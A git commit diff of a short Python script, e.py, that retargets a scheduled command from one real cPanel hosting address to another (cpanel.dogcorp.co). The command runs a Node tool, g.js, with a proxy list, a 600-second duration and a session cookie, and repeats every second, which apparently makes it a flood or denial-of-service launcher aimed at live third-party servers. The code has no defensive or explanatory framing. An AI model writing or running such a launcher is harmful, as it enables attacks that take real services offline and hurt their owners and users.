e50bd86bb86852a4d4dd0cfc231d6a90166d8dd5
junelynpalma <74013446+junelynpalma@users.noreply.github.com>
2021-09-25 00:49:37 +0800

    Update e.py

--- e.py
+++ e.py
@@ -3,10 +3,10 @@ import time
 import os
 import sys
 
-os.system('node g.js https://sg2plmcpnl487510.prod.sin2.secureserver.net:2083 http.txt 600 GET PHPSESSID:s08rg740aq8vv2mo406ejp4pa5')
+os.system('node g.js https://cpanel.dogcorp.co http.txt 600 GET PHPSESSID:s08rg740aq8vv2mo406ejp4pa5')
 
 def job():
-    os.system('node g.js https://sg2plmcpnl487510.prod.sin2.secureserver.net:2083 http.txt 600 GET PHPSESSID:s08rg740aq8vv2mo406ejp4pa5')
+    os.system('node g.js https://cpanel.dogcorp.co http.txt 600 GET PHPSESSID:s08rg740aq8vv2mo406ejp4pa5')
     
 schedule.every(1).seconds.do(job)
 
